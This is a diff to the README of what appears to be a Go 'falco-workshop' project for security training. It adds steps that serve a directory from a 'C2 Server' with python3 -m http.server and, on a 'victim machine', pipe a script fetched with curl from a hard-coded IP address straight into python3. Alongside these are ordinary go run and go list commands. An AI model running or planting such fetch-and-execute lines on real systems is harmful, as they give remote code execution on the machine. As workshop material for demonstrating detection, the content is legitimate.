@@ -1,6 +1,31 @@
 # README
 
 
+Remember: 
+
+    Adjust de go versions.
+
+    go version
+
+    Validate the project versions
+
+    go list -m -versions github.com/diego-all/falco-workshop
+
+
+In C2 Server execute:
+
+
+    cd /root
+
+    python3 -m http.server 80
+
+
+
+In victim machine execute:
+
+
+    curl -sL http://34.27.180.215/sitio/vuelta.txt | python3
+
 
     go run github.com/diego-all/falco-workshop@latest init --vector A
     go run main.go init --vector A
@@ -11,18 +36,4 @@
     go run main.go init --interactive
     
 
-    go run github.com/diego-all/run-from-gh@latest init --db postgres --config /home/diegoall/MAESTRIA_ING/CLI/run-from-gh/inputs/config.json projectTest 
-    go run main.go init --db postgres --config /home/diegoall/MAESTRIA_ING/CLI/run-from-gh/inputs/config.json projectTest
 
-
-
-
-
-validar versiones de golang
-
-    go run github.com/diego
-
-    go run main.go init --db postgres --config /home/diegoall/MAESTRIA_ING/CLI/run-from-gh/inputs/classes.json projectTest
-
-
-    go list -m -versions github.com/diego-all/falco-workshop
